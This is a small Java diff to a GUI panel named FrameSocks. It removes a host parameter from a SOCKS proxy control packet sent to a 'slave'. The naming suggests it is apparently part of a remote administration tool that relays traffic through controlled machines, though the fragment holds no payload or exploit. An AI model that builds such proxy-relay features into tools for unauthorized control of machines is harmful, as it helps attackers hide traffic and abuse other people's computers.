@@ -200,11 +200,10 @@ public class FrameSocks extends ClientPanel {
 				boolean auth = chckbxUseAuthentication.isSelected();
 				String user = txtUser.getText();
 				String pass = txtPass.getText();
-				String host = txtHost.getText();
 				final int port = (Integer) spinner_1.getValue();
 				final int incomingPort = (Integer) spinner.getValue();
 				
-				slave.addToSendQueue(new PacketControl(socks5, auth, user, pass, host, incomingPort));
+				slave.addToSendQueue(new PacketControl(socks5, auth, user, pass, incomingPort));
 
 				new Thread(new Runnable() {
 					public void run() {
